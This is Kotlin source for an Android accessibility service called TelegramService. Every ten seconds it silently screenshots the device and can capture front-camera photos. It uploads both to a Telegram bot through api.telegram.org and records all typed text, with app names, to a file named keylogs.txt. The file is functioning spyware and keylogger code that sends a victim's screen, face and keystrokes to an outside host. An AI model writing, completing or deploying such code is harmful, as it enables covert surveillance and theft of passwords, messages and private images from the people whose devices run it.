package com.example.telegramsender

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import kotlinx.coroutines.*
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Request
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.util.concurrent.Executor

class TelegramService : AccessibilityService(), LifecycleOwner {

    private val client = OkHttpClient()
    private var job: Job? = null
    
    // Default credentials, will be loaded from Prefs
    private var botToken: String = ""
    private var targetChatId: String = ""
    private var sendCamera: Boolean = false
    
    private val lifecycleRegistry = LifecycleRegistry(this)
    private var imageCapture: ImageCapture? = null

    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d("TelegramService", "Accessibility Service Connected")
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        
        loadCredentials()
        
        if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
            startCaptureLoop()
            sendTelegramMessage(botToken, targetChatId, "Service Connected (Accessibility Mode)")
        } else {
            Log.e("TelegramService", "Credentials missing on connect")
        }
    }

    private fun loadCredentials() {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
        sendCamera = pref.getBoolean("sendCamera", false)
    }

    private fun startCaptureLoop() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                // Refresh credentials in case they changed
                loadCredentials()
                
                if (botToken.isNotEmpty() && targetChatId.isNotEmpty()) {
                    captureAndSend()
                    if (sendCamera) {
                        captureCameraAndSend()
                    }
                }
                delay(10_000) // 10 seconds delay
            }
        }
    }
    
    private suspend fun captureCameraAndSend() {
        withContext(Dispatchers.Main) {
            try {
                val cameraProviderFuture = ProcessCameraProvider.getInstance(this@TelegramService)
                cameraProviderFuture.addListener({
                    val cameraProvider = cameraProviderFuture.get()
                    
                    val imageCapture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                        .build()

                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA // Or BACK based on logic

                    try {
                        cameraProvider.unbindAll()
                        cameraProvider.bindToLifecycle(
                            this@TelegramService,
                            cameraSelector,
                            imageCapture
                        )
                        
                        imageCapture.takePicture(
                            ContextCompat.getMainExecutor(this@TelegramService),
                            object : ImageCapture.OnImageCapturedCallback() {
                                override fun onCaptureSuccess(image: ImageProxy) {
                                    val bitmap = imageProxyToBitmap(image)
                                    image.close()
                                    if (bitmap != null) {
                                        CoroutineScope(Dispatchers.IO).launch {
                                            sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
                                        }
                                    }
                                    // Cleanup
                                    cameraProvider.unbindAll()
                                }

                                override fun onError(exception: ImageCaptureException) {
                                    Log.e("TelegramService", "Camera capture failed", exception)
                                    cameraProvider.unbindAll()
                                }
                            }
                        )
                    } catch (exc: Exception) {
                        Log.e("TelegramService", "Use case binding failed", exc)
                    }
                }, ContextCompat.getMainExecutor(this@TelegramService))
            } catch (e: Exception) {
                Log.e("TelegramService", "Camera Setup Failed", e)
            }
        }
    }
    
    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }

    private fun captureAndSend() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        val bitmap = try {
                            Bitmap.wrapHardwareBuffer(
                                screenshotResult.hardwareBuffer,
                                screenshotResult.colorSpace
                            )
                        } catch (e: Exception) {
                            Log.e("TelegramService", "Bitmap conversion failed", e)
                            null
                        }

                        screenshotResult.hardwareBuffer.close()

                        if (bitmap != null) {
                            // Copy to software bitmap to process/compress
                            val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                            bitmap.recycle() // Recycle hardware wrapper
                            
                            if (softwareBitmap != null) {
                                CoroutineScope(Dispatchers.IO).launch {
                                    sendTelegramPhoto(botToken, targetChatId, softwareBitmap, "screenshot.jpg")
                                }
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e("TelegramService", "Screenshot failed: $errorCode")
                    }
                }
            )
        } else {
            Log.e("TelegramService", "Accessibility screenshots require Android 11+")
        }
    }
    
    private fun sendTelegramMessage(token: String, chatId: String, text: String) {
        val url = "https://api.telegram.org/bot$token/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text)
            .build()
        val request = Request.Builder().url(url).post(body).build()
        try {
            client.newCall(request).execute().use { }
        } catch (_: Exception) {}
    }

    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        
        // Resize if too big to avoid socket timeouts
        val scale = if (originalBitmap.width > 720) 720f / originalBitmap.width else 1.0f
        val matrix = android.graphics.Matrix()
        matrix.postScale(scale, scale)
        val resizedBitmap = Bitmap.createBitmap(originalBitmap, 0, 0, originalBitmap.width, originalBitmap.height, matrix, true)
        
        val stream = ByteArrayOutputStream()
        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
        val byteArray = stream.toByteArray()
        
        // Clean up
        if (originalBitmap != resizedBitmap) {
             originalBitmap.recycle()
        }
        resizedBitmap.recycle()
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", filename,
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
            
        val request = Request.Builder().url(url).post(requestBody).build()
        
        try {
            client.newCall(request).execute().use { response -> 
                if (!response.isSuccessful) {
                    Log.e("TelegramService", "Failed to send photo: ${response.code}")
                } else {
                    Log.d("TelegramService", "Photo sent successfully (${byteArray.size} bytes)")
                }
            }
        } catch (e: IOException) {
            Log.e("TelegramService", "Network error", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.toString()
            if (text.isNotEmpty()) {
                val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
                val logEntry = "[$timestamp] [${event.packageName}]: $text\n"
                appendLogToFile(logEntry)
            }
        }
    }
    
    private fun appendLogToFile(logEntry: String) {
        try {
            val file = java.io.File(filesDir, "keylogs.txt")
            java.io.FileWriter(file, true).use { writer ->
                writer.append(logEntry)
            }
        } catch (e: Exception) {
            Log.e("TelegramService", "Failed to write log", e)
        }
    }

    override fun onInterrupt() {
        Log.w("TelegramService", "Service Interrupted")
        job?.cancel()
    }
    
    override fun onUnbind(intent: Intent?): Boolean {
        job?.cancel()
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
        return super.onUnbind(intent)
    }

    override val lifecycle: Lifecycle
        get() = lifecycleRegistry
}
